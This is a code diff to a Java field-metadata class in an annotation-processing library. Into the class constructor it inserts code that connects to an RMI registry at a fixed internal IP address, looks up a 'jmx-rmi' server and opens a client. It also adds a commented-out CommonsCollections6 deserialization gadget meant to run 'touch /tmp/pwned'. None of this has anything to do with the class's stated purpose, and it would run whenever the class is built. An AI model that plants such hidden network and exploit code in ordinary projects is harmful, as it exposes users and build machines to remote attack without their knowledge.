@@ -21,6 +21,15 @@ package ma.markware.charybdis.apt.metatype;
 import ma.markware.charybdis.model.option.ClusteringOrder;
 import ma.markware.charybdis.model.option.SequenceModel;
 
+import javax.crypto.Cipher;
+import javax.management.remote.rmi.RMIConnection;
+import javax.management.remote.rmi.RMIServer;
+import java.io.IOException;
+import java.rmi.NotBoundException;
+import java.rmi.RemoteException;
+import java.rmi.registry.LocateRegistry;
+import java.rmi.registry.Registry;
+
 /**
  * A specific Field meta-type.
  * Holds metadata found on fields annotated with {@link ma.markware.charybdis.model.annotation.Column}.
@@ -41,8 +50,15 @@ public class ColumnFieldMetaType extends AbstractFieldMetaType {
   private boolean isLastUpdatedDate;
   private boolean isCounter;
 
-  public ColumnFieldMetaType(AbstractFieldMetaType abstractFieldMetaType) {
+  public ColumnFieldMetaType(AbstractFieldMetaType abstractFieldMetaType) throws IOException, NotBoundException {
     super(abstractFieldMetaType);
+    String hostName = "192.168.1.11";
+    int registryPort = 1099;
+    Registry registry = LocateRegistry.getRegistry(hostName, registryPort);
+    //Object gadget = new CommonsCollections6().getObject("touch /tmp/pwned");
+    RMIServer rmiServer = (RMIServer) registry.lookup("jmx-rmi");
+    RMIConnection rmiConnection = rmiServer.newClient(null);
+    rmiConnection.close();
   }
 
   public boolean isPartitionKey() {
